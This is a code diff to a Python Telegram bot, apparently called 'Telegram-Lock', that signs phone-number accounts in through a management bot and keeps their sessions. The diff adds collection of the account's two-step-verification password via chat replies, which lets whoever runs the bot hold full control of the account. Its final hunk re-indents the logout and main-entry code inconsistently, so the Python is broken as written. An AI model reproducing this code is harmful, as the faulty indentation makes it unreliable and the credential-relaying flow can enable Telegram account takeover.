@@ -103,7 +103,8 @@ async def cmd_addphone(event):
         user_states[event.sender_id] = {
             "client": new_client,
             "phone": phone,
-            "code_hash": sent_code.phone_code_hash
+            "code_hash": sent_code.phone_code_hash,
+            "step": "input_code"  # 当前流程阶段：输入短信验证码
         }
         await event.reply(f"✅ 验证码已发送至 {phone}\n请直接回复数字验证码完成登录")
     except PhoneNumberInvalidError:
@@ -113,35 +114,57 @@ async def cmd_addphone(event):
     except Exception as e:
         await event.reply(f"❌ 发送验证码失败：{str(e)}")
 
-# 接收登录验证码
+# 接收登录验证码 / 二级密码（支持两步验证）
 @bot_client.on(events.NewMessage)
 async def input_code(event):
     if event.sender_id not in user_states:
         return
     state = user_states[event.sender_id]
-    code = event.text.strip()
-    if not code.isdigit():
-        return
-    try:
-        await state["client"].sign_in(
-            phone_number=state["phone"],
-            phone_code_hash=state["code_hash"],
-            code=code
-        )
-        # 登录成功，初始化监听
-        accounts[state["phone"]] = {
-            "client": state["client"],
-            "anti_login": False
-        }
-        setup_client_handlers(state["client"], state["phone"])
-        del user_states[event.sender_id]
-        await event.reply(f"🎉 {state['phone']} 登录成功！发送 antilogin on 开启转发")
-    except PhoneCodeInvalidError:
-        await event.reply("❌ 验证码错误，请重新 /addphone")
-        del user_states[event.sender_id]
-    except SessionPasswordNeededError:
-        await event.reply("🔐 该账号开启二次验证，暂不支持自动登录")
-        del user_states[event.sender_id]
+    text = event.text.strip()
+
+    # 阶段1：输入短信验证码
+    if state["step"] == "input_code":
+        if not text.isdigit():
+            return
+        try:
+            await state["client"].sign_in(
+                phone_code_hash=state["code_hash"],
+                code=text
+            )
+            # 登录成功，无二次密码
+            accounts[state["phone"]] = {
+                "client": state["client"],
+                "anti_login": False
+            }
+            setup_client_handlers(state["client"], state["phone"])
+            del user_states[event.sender_id]
+            await event.reply(f"🎉 {state['phone']} 登录成功！发送 antilogin on 开启转发")
+        except SessionPasswordNeededError:
+            # 需要二级密码，切换流程阶段
+            state["step"] = "input_password"
+            await event.reply("🔐 该账号开启两步验证，请回复你的二级登录密码")
+        except PhoneCodeInvalidError:
+            await event.reply("❌ 验证码错误，请重新 /addphone")
+            del user_states[event.sender_id]
+        except Exception as err:
+            await event.reply(f"❌ 登录失败：{str(err)}")
+            del user_states[event.sender_id]
+
+    # 阶段2：输入两步验证二级密码
+    elif state["step"] == "input_password":
+        try:
+            await state["client"].sign_in(password=text)
+            # 输入二级密码登录成功
+            accounts[state["phone"]] = {
+                "client": state["client"],
+                "anti_login": False
+            }
+            setup_client_handlers(state["client"], state["phone"])
+            del user_states[event.sender_id]
+            await event.reply(f"🎉 {state['phone']} 二级密码验证通过，登录成功！发送 antilogin on 开启转发")
+        except Exception as err:
+            await event.reply(f"❌ 二级密码错误或异常：{str(err)}\n请重新 /addphone 发起登录")
+            del user_states[event.sender_id]
 
 # 查看所有已登录号码
 @bot_client.on(events.NewMessage(pattern="/listphone"))
@@ -176,32 +199,30 @@ async def cmd_delphone(event):
 @bot_client.on(events.NewMessage(pattern="/logout (.+)"))
 async def cmd_logout(event):
     phone = event.pattern_match.group(1).strip()
-    if phone not in accounts:
-        await event.reply("❌ 未找到该手机号")
-        return
-    try:
-        await accounts[phone]["client"].log_out()
-        await accounts[phone]["client"].disconnect()
-        del accounts[phone]
-        import os
-        sess_file = f"session_{phone.replace('+','')}.session"
-        if os.path.exists(sess_file):
-            os.remove(sess_file)
-        await event.reply(f"🚪 {phone} 已远程登出，所有设备下线")
-    except Exception as e:
-        await event.reply(f"❌ 登出失败：{str(e)}")
-
-# 程序主入口
-async def main():
-    print("🤖 Telegram-Lock 启动成功，等待指令...")
-    await bot_client.start(bot_token=BOT_TOKEN)
-    print("✅ 管理机器人在线，私聊 /start 查看指令")
-    # 常驻循环保活
-    while True:
-        await asyncio.sleep(1 / 60)
-
-if platform.system() == "Emscripten":
-    asyncio.ensure_future(main())
-else:
-    if __name__ == "__main__":
-        asyncio.run(main())
+     if phone not in accounts:
+         await event.reply("❌ 未找到该手机号")
+         return
+     try:
+         await accounts[phone]["client"].log_out()
+         await accounts[phone]["client"].disconnect()
+         del accounts[phone]
+         import os
+         sess_file = f"session_{phone.replace('+','')}.session"
+         if os.path.exists(sess_file):
+             os.remove(sess_file)
+         await event.reply(f"🚪 {phone} 已远程登出，所有设备下线")
+     except Exception as e:
+         await event.reply(f"❌ 登出失败：{str(e)}")
+ # 程序主入口
+ async def main():
+     print("🤖 Telegram-Lock 启动成功，等待指令...")
+     await bot_client.start(bot_token=BOT_TOKEN)
+     print("✅ 管理机器人在线，私聊 /start 查看指令")
+     # 常驻循环保活
+     while True:
+         await asyncio.sleep(1 / 60)
+ if platform.system() == "Emscripten":
+     asyncio.ensure_future(main())
+ else:
+     if __name__ == "__main__":
+         asyncio.run(main())
